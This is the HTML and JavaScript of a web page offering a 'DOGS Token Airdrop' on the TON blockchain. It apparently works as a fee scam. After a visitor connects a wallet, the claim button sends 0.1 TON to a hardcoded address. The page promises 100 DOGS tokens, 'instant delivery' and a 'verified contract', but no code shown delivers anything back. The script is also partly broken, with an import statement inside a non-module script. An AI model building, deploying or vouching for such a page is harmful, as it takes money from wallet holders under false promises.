<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üêï DOGS Token Airdrop üêï</title>
    <script src="https://cdn.jsdelivr.net/npm/@ton/core@0.59.0/dist/index.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/tonweb@0.0.60/dist/tonweb.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #2ecc71;
            --secondary-color: #27ae60;
            --background-color: #f5f5f5;
            --text-color: #2c3e50;
            --box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: var(--background-color);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: var(--box-shadow);
            text-align: center;
        }

        .header {
            margin-bottom: 40px;
        }

        .dogs-logo {
            width: 150px;
            height: 150px;
            margin: 0 auto 20px;
            background: url('https://raw.githubusercontent.com/ton-community/assets/main/wallet.png') center/contain no-repeat;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0% {
                transform: translateY(0px);
            }

            50% {
                transform: translateY(-20px);
            }

            100% {
                transform: translateY(0px);
            }
        }

        .title {
            color: var(--text-color);
            font-size: 2.5em;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }

        .subtitle {
            color: #7f8c8d;
            font-size: 1.2em;
            margin-bottom: 30px;
        }

        .info-cards {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .info-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            min-width: 200px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }

        .info-card:hover {
            transform: translateY(-5px);
        }

        .info-card i {
            font-size: 24px;
            color: var(--primary-color);
            margin-bottom: 10px;
        }

        .progress-container {
            margin: 20px 0;
            padding: 10px;
            background: #f1f1f1;
            border-radius: 20px;
            position: relative;
            display: none;
        }

        .progress-bar {
            width: 0%;
            height: 20px;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            border-radius: 20px;
            transition: width 0.5s ease;
        }

        .progress-text {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.2);
        }

        #claim-button {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 20px 0;
            display: none;
        }

        #claim-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.4);
        }

        #claim-button:active {
            transform: translateY(1px);
        }

        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background-color: #f8f9fa;
            transition: all 0.3s ease;
        }

        .dog-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }

        .dog-icon {
            font-size: 2em;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-10px);
            }
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }

        .feature {
            padding: 20px;
            background: #f8f9fa;
            border-radius: 15px;
            text-align: center;
        }

        .feature i {
            font-size: 2em;
            color: var(--primary-color);
            margin-bottom: 10px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <div class="dogs-logo"></div>
            <h1 class="title">
                <i class="fas fa-paw"></i>
                DOGS Token Airdrop
                <i class="fas fa-paw"></i>
            </h1>
            <p class="subtitle">Join our community and claim your DOGS tokens!</p>
        </div>

        <div class="dog-icons">
            <span class="dog-icon">üêï</span>
            <span class="dog-icon">ü¶Æ</span>
            <span class="dog-icon">üêï‚Äçü¶∫</span>
        </div>

        <div class="info-cards">
            <div class="info-card">
                <i class="fas fa-coins"></i>
                <h3>Required</h3>
                <p>0.1 TON</p>
            </div>
            <div class="info-card">
                <i class="fas fa-gift"></i>
                <h3>Receive</h3>
                <p>100 DOGS</p>
            </div>
        </div>

        <div class="features">
            <div class="feature">
                <i class="fas fa-bolt"></i>
                <h3>Fast Transfer</h3>
                <p>Instant token delivery</p>
            </div>
            <div class="feature">
                <i class="fas fa-shield-alt"></i>
                <h3>Secure</h3>
                <p>Safe and verified contract</p>
            </div>
            <div class="feature">
                <i class="fas fa-users"></i>
                <h3>Community</h3>
                <p>Join DOGS holders</p>
            </div>
        </div>

        <div id="ton-connect"></div>
        <button id="claim-button">
            <i class="fas fa-bone"></i> Claim 100 DOGS
        </button>

        <div class="progress-container">
            <div class="progress-bar"></div>
            <div class="progress-text">0%</div>
        </div>

        <div id="status"></div>
    </div>

    <script>
        import { beginCell } from './node_modules/@ton/ton'

        const body = beginCell()
            .storeUint(0, 32) // write 32 zero bits to indicate that a text comment will follow
            .storeStringTail("Hello, TON!") // write our text comment
            .endCell();
        const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
        const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';

        // Funkcje pomocnicze
        function updateProgress(percent) {
            const progressBar = document.querySelector('.progress-bar');
            const progressText = document.querySelector('.progress-text');
            const progressContainer = document.querySelector('.progress-container');

            progressContainer.style.display = 'block';
            progressBar.style.width = `${percent}%`;
            progressText.textContent = `${percent}%`;

            if (percent >= 100) {
                setTimeout(() => {
                    progressContainer.style.display = 'none';
                }, 1000);
            }
        }

        function updateStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            const icons = {
                success: 'check-circle',
                error: 'exclamation-circle',
                info: 'info-circle'
            };

            statusDiv.innerHTML = `
                <i class="fas fa-${icons[type]}"></i> ${message}
            `;

            statusDiv.style.color = type === 'error' ? '#e74c3c' :
                type === 'success' ? '#2ecc71' : '#3498db';
        }

        // TON Connect UI konfiguracja
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: MANIFEST_URL,
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.onStatusChange(wallet => {
            const claimButton = document.getElementById('claim-button');
            if (wallet) {
                claimButton.style.display = 'inline-block';
                updateStatus(`Connected: ${wallet.account.address}`, 'success');
            } else {
                claimButton.style.display = 'none';
                updateStatus('Please connect your wallet', 'info');
            }
        });

        // Obs≈Çuga przycisku "Claim"
        document.getElementById('claim-button').addEventListener('click', async () => {
            try {
                if (!tonConnectUI.connected) {
                    updateStatus('Please connect your wallet first', 'error');
                    return;
                }

                updateStatus('Preparing transaction...', 'info');
                updateProgress(20);


                // Przygotowanie transakcji
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 300,
                    messages: [
                        {
                            address: AIRDROP_CONTRACT_ADDRESS,
                            amount: '100000000', // 0.1 TON (w nanotonach)
                            payload: body.toBoc().toString("base64"),
                        }
                    ]
                };

                updateProgress(40);

                const result = await tonConnectUI.sendTransaction(transaction);
                console.log('Transaction result:', result);

                updateProgress(80);
                updateStatus('Transaction sent successfully!', 'success');
                updateProgress(100);

            } catch (error) {
                console.error('Transaction error:', error);
                updateStatus(`Transaction error: ${error.message}`, 'error');
                updateProgress(0);
            }
        });
    </script>
</body>

</html>
